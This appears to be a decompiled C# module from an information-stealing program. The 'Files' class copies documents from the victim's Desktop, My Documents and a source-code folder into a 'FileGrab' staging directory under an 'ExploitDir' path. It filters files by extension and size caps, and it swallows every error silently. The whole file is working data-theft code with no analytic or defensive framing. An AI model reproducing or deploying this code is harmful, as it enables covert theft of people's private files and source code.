using System;
using System.Collections.Generic;
using System.IO;

namespace exos;

public class Files
{
	public static int count;

	public static void GetFiles()
	{
		try
		{
			string text = Helper.ExploitDir + "\\FileGrab";
			Directory.CreateDirectory(text);
			if (!Directory.Exists(text))
			{
				GetFiles();
				return;
			}
			CopyDirectory(Helper.DesktopPath, text, "*.*", cfg.sizefile);
			CopyDirectory(Helper.MyDocuments, text, "*.*", cfg.sizefile);
			CopyDirectory(Helper.UserProfile + "\\source", text, "*.*", cfg.sizefile);
		}
		catch
		{
		}
	}

	private static long GetDirSize(string path, long size = 0L)
	{
		try
		{
			foreach (string item in Directory.EnumerateFiles(path))
			{
				try
				{
					size += new FileInfo(item).Length;
				}
				catch
				{
				}
			}
			foreach (string item2 in Directory.EnumerateDirectories(path))
			{
				try
				{
					size += GetDirSize(item2, 0L);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		return size;
	}

	public static void CopyDirectory(string source, string target, string pattern, long maxSize)
	{
		Stack<GetFiles.Folders> stack = new Stack<GetFiles.Folders>();
		stack.Push(new GetFiles.Folders(source, target));
		long num = GetDirSize(target, 0L);
		while (stack.Count > 0)
		{
			GetFiles.Folders folders = stack.Pop();
			try
			{
				Directory.CreateDirectory(folders.Target);
				foreach (string item in Directory.EnumerateFiles(folders.Source, pattern))
				{
					try
					{
						if (Array.IndexOf(cfg.extensions, Path.GetExtension(item).ToLower()) < 0)
						{
							continue;
						}
						string text = Path.Combine(folders.Target, Path.GetFileName(item));
						if (new FileInfo(item).Length / 1024 < 5000)
						{
							File.Copy(item, text);
							num += new FileInfo(text).Length;
							if (num > maxSize)
							{
								return;
							}
							count++;
						}
					}
					catch
					{
					}
				}
			}
			catch (UnauthorizedAccessException)
			{
				continue;
			}
			catch (PathTooLongException)
			{
				continue;
			}
			try
			{
				foreach (string item2 in Directory.EnumerateDirectories(folders.Source))
				{
					try
					{
						if (!item2.Contains(Path.Combine(Helper.DesktopPath, Environment.UserName)))
						{
							stack.Push(new GetFiles.Folders(item2, Path.Combine(folders.Target, Path.GetFileName(item2))));
						}
					}
					catch
					{
					}
				}
			}
			catch (UnauthorizedAccessException)
			{
			}
			catch (DirectoryNotFoundException)
			{
			}
			catch (PathTooLongException)
			{
			}
		}
		stack.Clear();
	}
}
